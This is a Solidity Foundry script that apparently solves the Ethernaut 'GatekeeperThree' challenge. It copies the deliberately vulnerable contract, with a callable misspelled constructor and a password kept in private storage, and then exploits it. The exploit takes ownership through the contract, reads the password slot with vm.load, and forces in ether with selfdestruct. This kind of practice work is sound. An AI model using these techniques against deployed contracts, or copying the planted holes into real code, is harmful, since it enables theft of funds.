// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;
pragma experimental ABIEncoderV2;

import {BaseTest} from "test/utils/BaseTest.t.sol";
import {console2} from "forge-std/console2.sol";

contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }

    function trickyTrick() public {
        if (address(this) == msg.sender && address(this) != trick) {
            target.getAllowance(password);
        }
    }
}

contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}

contract Attack {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function StepOne() public {
        (bool success,) = target.call(abi.encodeWithSignature("construct0r()"));
        require(success, "Failed to call construct0r");
    }

    function stepTwo() public {
        (bool success,) = target.call(abi.encodeWithSignature("enter()"));
        require(success, "Failed to call enter");
    }
}

contract Self {
    function attack(address _victim) public {
        selfdestruct(payable(_victim));
    }

    receive() external payable {}
}

contract GatekeeperThreeTest is BaseTest {
    GatekeeperThree gatekeeperThree = GatekeeperThree(payable(contractAddress));
    // GatekeeperThree gatekeeperThree = new GatekeeperThree();

    function run() external {
        vm.startBroadcast(deployer);
        Attack attack = new Attack(contractAddress);
        gatekeeperThree.createTrick();
        SimpleTrick trick = gatekeeperThree.trick();

        // gateOne
        attack.StepOne();

        // gateTwo
        uint256 _password = uint256(vm.load(address(trick), bytes32(uint256(2))));
        gatekeeperThree.getAllowance(_password);
        assert(gatekeeperThree.allowEntrance() == true);

        // gateThree
        Self self = new Self();
        address(self).call{value: 0.001001 ether}("");
        self.attack(address(gatekeeperThree));

        attack.stepTwo();

        assert(gatekeeperThree.entrant() == deployer);
    }
}
